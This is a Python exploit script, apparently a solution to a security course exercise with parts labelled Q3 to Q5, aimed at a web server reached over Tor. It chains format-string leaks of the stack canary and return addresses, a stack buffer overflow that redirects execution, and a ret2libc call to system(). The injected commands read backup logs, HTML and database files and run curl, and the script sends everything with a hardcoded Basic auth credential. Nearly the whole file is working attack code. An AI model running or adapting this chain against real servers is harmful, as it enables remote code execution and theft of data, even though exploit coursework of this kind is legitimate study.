import base64
import os


def getLeak(s):
    auth = s + ":"
    curl = "curl --max-time 10 --socks5-hostname 127.0.0.1:9050 -I 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/'  -H 'Authorization: Basic "+ base64.b64encode(auth.encode()).decode("utf-8") +"'"
    res = os.popen(curl).read()
    start = res.find("Invalid user: ") + 14
    return res[start:start + 10]

def replaceNullByte(s): # In order to add the '&'(0x26) that will be replaced with 0x00 (useful for the last null byte of the canary because of strcpy)
    if(s == "00"):
        return "26"
    else:
        return s

def hexReverseOrder(s, fun = None):
    if fun != None:
        return fun(s[-2] + s[-1]) + fun(s[-4] + s[-3]) + fun(s[-6] + s[-5]) + fun(s[-8] + s[-7])
    else:
        return s[-2] + s[-1] + s[-4] + s[-3] + s[-6] + s[-5] + s[-8] + s[-7]


canary = ""
ebp_addr = ""
ret_addr = ""
libc_ret_addr = ""
while True:
    canary = getLeak("%27$p") # Canary leak
    ebp_addr = getLeak("%30$p") # Ebp of route() function
    ret_addr = getLeak("%31$p") # Return address leak
    libc_ret_addr = getLeak("%111$p") # Return address of main in libc
    if len(canary) and len(ebp_addr) and len(ret_addr) and len(libc_ret_addr): 
        arr_addr = hex(int(ebp_addr, 16) - 232) # Start of the buffer is located 232 bytes below the address of the ebp of the route function 
        if "00" not in arr_addr: # If buffer address contains zero strcpy will not allow buffer overflow
            break

if canary[-1] == "\"":
    zeros = 10 - len(canary) + 1
    repl = "0x"
    for i in range(zeros):
        repl += "0"
    canary = canary.replace("0x", repl)[0 : len(canary)]

if ebp_addr[-1] == "\"":
    zeros = 10 - len(ebp_addr) + 1
    repl = "0x"
    for i in range(zeros):
        repl += "0"
    ebp_addr = ebp_addr.replace("0x", repl)[0 : len(ebp_addr)]

if ret_addr[-1] == "\"":
    zeros = 10 - len(ret_addr) + 1
    repl = "0x"
    for i in range(zeros):
        repl += "0"
    ret_addr = ret_addr.replace("0x", repl)[0 : len(ret_addr)]

if libc_ret_addr[-1] == "\"":
    zeros = 10 - len(libc_ret_addr) + 1
    repl = "0x"
    for i in range(zeros):
        repl += "0"
    libc_ret_addr = libc_ret_addr.replace("0x", repl)[0 : len(libc_ret_addr)]


print("Canary: " + canary)
print("Address in code segment (return address): " + ret_addr)
print("Address in stack (ebp): " + ebp_addr)
print("Address in libc: " + libc_ret_addr)

i = 0
hex_string = ""

while i < 120:
    hex_string = hex_string + hexReverseOrder(arr_addr)
    i = i + 8 
 
hex_string = hex_string + hexReverseOrder(canary, replaceNullByte)
i = i + 8 # Counter fixed 

while i < 144:
    hex_string = hex_string + "f" # Padding with f's
    i = i + 1

hex_string = hex_string + hexReverseOrder(ebp_addr, replaceNullByte) # Ebp fixed

################################################################### Q3 ###################################################################
payload1 = hex_string

ret_addr1 = hex(int(ret_addr, 16) + 2184) # The return address of the post_param() function has been set to the start of the serve_ultimate() function (2184 bytes above the <route+114>)
payload1 = payload1 + hexReverseOrder(ret_addr1, replaceNullByte)

ret_addr2 = hex(int(ret_addr, 16) + 688) # The return address of the serve_ultimate() function has been set to the end of the route() function (688 bytes above the <route+114>)
payload1 = payload1 + hexReverseOrder(ret_addr2, replaceNullByte)

f = open('payload.txt', 'wb')
f.write(bytes.fromhex(payload1))
f.close()

print("\nResult of Q3:\n" )
result = os.popen("curl -s --max-time 2 --socks5-hostname 127.0.0.1:9050 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==' -H 'Content-Length: 0' --data-binary '@payload.txt'")
out = result.read()
if out:
    print(out)
else:
    exit(1)

##########################################################################################################################################

libc_base = hex(int(libc_ret_addr, 16) - 102177) # Base address of libc is located 102177 bytes before return address of main in libc
system_addr = hex(int(libc_base, 16) + 250592) # System is located 250592 bytes after the base address of libc
hex_string = hex_string + hexReverseOrder(system_addr, replaceNullByte)
hex_string = hex_string + hexReverseOrder(ret_addr2, replaceNullByte) # The return address of the system() function has been set to the end of the route() function (688 bytes above the <route+114>)
str_addr = hex(int(ebp_addr, 16) - 144) # Start of the string is 144 bytes below the address of the ebp of the route function 
hex_string = hex_string + hexReverseOrder(str_addr)


################################################################### Q4 ###################################################################

payload2 = hex_string + "636174202f7661722f6261636b75702f6261636b75702e6c6f6726" # 'cat /var/backup/backup.log'
payload3 = hex_string + "636174202f7661722f6261636b75702f696e6465782e68746d6c26" # 'cat /var/backup/index.html'
payload4 = hex_string + "636174202f7661722f6261636b75702f7a2e6c6f6726" # 'cat /var/backup/z.log'
#payload2 = hex_string + "636174202f7661722f6261636b75702f626f622e73716c26" # 'cat /var/backup/bob.sql'
#payload2 = hex_string + "636174202f7661722f6261636b75702f706c61796c69737426" # 'cat /var/backup/playlist'

f = open('payload.txt', 'wb')
f.write(bytes.fromhex(payload2))
f.close()

print("\nResult of Q4:\n\n--backup.log\n\n")
result = os.popen("curl -s --http0.9 --max-time 2 --socks5-hostname 127.0.0.1:9050 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==' -H 'Content-Length: 0' --data-binary '@payload.txt'")
out = result.read()
if out:
    print(out)
else:
    exit(1)

f = open('payload.txt', 'wb')
f.write(bytes.fromhex(payload3))
f.close()

print("--index.html\n\n")
result = os.popen("curl -s --http0.9 --max-time 2 --socks5-hostname 127.0.0.1:9050 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==' -H 'Content-Length: 0' --data-binary '@payload.txt'")
out = result.read()
if out:
    print(out)
else:
    exit(1)

f = open('payload.txt', 'wb')
f.write(bytes.fromhex(payload4))
f.close()

print("--z.log\n\n")
result = os.popen("curl -s --http0.9 --max-time 2 --socks5-hostname 127.0.0.1:9050 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==' -H 'Content-Length: 0' --data-binary '@payload.txt'")
out = result.read()
if out:
    print(out)
else:
    exit(1)

##########################################################################################################################################

################################################################### Q5 ###################################################################

payload5 = hex_string + "6375726c206966636f6e6669672e6d6526" # 'curl ifconfig.me'


f = open('payload.txt', 'wb')
f.write(bytes.fromhex(payload5))
f.close()

print("\nResult of Q5:\n")
result = os.popen("curl -s --http0.9 --max-time 2 --socks5-hostname 127.0.0.1:9050 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==' -H 'Content-Length: 0' --data-binary '@payload.txt'")
out = result.read()
if out:
    print("c4" + out)
else:
    exit(1)

##########################################################################################################################################
exit(0)